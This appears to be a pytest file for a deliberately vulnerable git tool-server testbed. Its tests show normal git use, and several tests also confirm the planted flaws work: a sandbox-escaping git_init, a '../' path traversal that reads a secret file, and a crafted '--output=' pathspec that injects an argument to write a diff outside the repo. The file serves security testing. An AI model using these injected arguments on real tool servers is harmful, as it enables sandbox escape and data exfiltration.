from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from adop_testbed.sandbox import PROJECT_ROOT, REPO_ROOT
from tests.conftest import open_session, text_of


@pytest.mark.asyncio
async def test_git_status_clean_at_baseline():
    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool("git_status", {})
        assert not result.is_error
        status = text_of(result)
        assert status.startswith("## ") or status == "(clean)"


@pytest.mark.asyncio
async def test_git_log_returns_seeded_commits():
    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool("git_log", {"max_count": 10})
        log = text_of(result)
        assert "Initial scaffold for checkout-service" in log


@pytest.mark.asyncio
async def test_add_and_commit_round_trip():
    async with open_session("adop_testbed.servers.filesystem_server") as fs_session:
        await fs_session.call_tool("write_file", {"path": "src/checkout.js", "content": "// changed\n"})
    async with open_session("adop_testbed.servers.git_server") as session:
        add_result = await session.call_tool("git_add", {"path": "src/checkout.js"})
        assert not add_result.is_error
        commit_result = await session.call_tool("git_commit", {"message": "test commit"})
        assert not commit_result.is_error
        log = text_of(await session.call_tool("git_log", {"max_count": 1}))
        assert "test commit" in log


# ---------------------------------------------------------------------------
# Intentional vulnerabilities: prove they are genuinely exploitable, not just
# documented. These tests are the ground truth a Student-Developed Agent
# Trust and Assurance Tool's own tests should be able to reproduce from the
# audit log alone.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_git_init_escapes_sandbox_cve_2025_68143():
    with tempfile.TemporaryDirectory() as tmp:
        target = Path(tmp) / "not-the-testbed-repo"
        async with open_session("adop_testbed.servers.git_server") as session:
            result = await session.call_tool("git_init", {"target_path": str(target)})
        assert not result.is_error
        assert (target / ".git").exists(), "git_init must be able to write outside REPO_ROOT to prove CVE-2025-68143"


@pytest.mark.asyncio
async def test_git_show_worktree_path_traversal_cve_2025_68144():
    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool("git_show_worktree", {"path": "../data/secret-outside-sandbox.txt"})
        assert not result.is_error
        assert "THIS FILE LIVES OUTSIDE testbed-repo/" in text_of(result)


@pytest.mark.asyncio
async def test_git_show_worktree_does_not_use_safe_resolve_for_in_sandbox_reads():
    """Sanity check that the vulnerable tool still works normally for legitimate paths."""
    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool("git_show_worktree", {"path": "README.md"})
        assert "checkout-service" in text_of(result)


@pytest.mark.asyncio
async def test_git_diff_argument_injection_cve_2025_68144():
    exfiltrated = PROJECT_ROOT / "data" / "exfiltrated-diff.txt"
    if exfiltrated.exists():
        exfiltrated.unlink()

    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool(
            "git_diff",
            {"ref": "HEAD", "pathspec": "--output=../data/exfiltrated-diff.txt ."},
        )
        assert not result.is_error

    assert exfiltrated.exists(), "a crafted pathspec must be able to redirect git diff output outside REPO_ROOT"
    exfiltrated.unlink()


@pytest.mark.asyncio
async def test_git_diff_normal_usage_is_unaffected():
    async with open_session("adop_testbed.servers.filesystem_server") as fs_session:
        await fs_session.call_tool("write_file", {"path": "src/checkout.js", "content": "// changed for diff test\n"})
    async with open_session("adop_testbed.servers.git_server") as session:
        result = await session.call_tool("git_diff", {"ref": "HEAD", "pathspec": "."})
        assert not result.is_error
        assert "checkout.js" in text_of(result)
